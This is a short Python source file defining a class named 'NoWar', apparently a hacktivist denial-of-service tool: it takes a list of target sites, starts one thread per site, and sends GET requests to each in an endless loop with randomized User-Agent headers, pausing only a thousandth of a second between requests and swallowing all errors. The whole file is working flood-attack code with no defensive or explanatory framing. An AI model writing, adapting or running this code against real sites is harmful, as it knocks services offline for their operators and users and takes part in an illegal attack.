import threading
from random import randrange
from time import sleep

import requests


class NoWar:

	agents_quantity: int = 5
	sleep_time: float or int = 0.001

	_agents: list = None
	_sites: list = None

	def __init__(self, sites: list, agents: list):
		self._agents = self.prepare_random_agents(agents)
		self._sites = sites

	def prepare_random_agents(self, agents):
		len_agents = len(agents)
		res = []

		for i in range(0, self.agents_quantity):
			rnd_val = randrange(0, len_agents)
			res.append(agents[rnd_val])

		return res

	def query_host(self, host):
		rnd = randrange(0, len(self._agents))
		agent = self._agents[rnd]

		h = {'User-Agent': str(agent)}

		return requests.get(host, headers=h, timeout=5)

	def deploy(self):
		threads = []
		print('NoWar app deployed')
		for site in self._sites:
			t = threading.Thread(target=self.one_host, args=(site, ))
			threads.append(t)
			t.start()

		for t in threads:
			t.join()

	def one_host(self, host):
		print(f'Started loop for host: {host}')
		while True:
			try:
				res = self.query_host(host)
				if res.status_code == 200:
					print(f'Request is ok: {host}')
				else:
					print(f'Request is not ok: {host}')
				print(res)
			except Exception as e:
				print(f'Exception: {e}')
			print(f'Endpoint: {host}')
			sleep(self.sleep_time)

	@classmethod
	def extract_lines(cls, file: str):
		res = []
		with open(file, 'rt') as fd:
			for line in fd:
				res.append(line.strip())

		return res
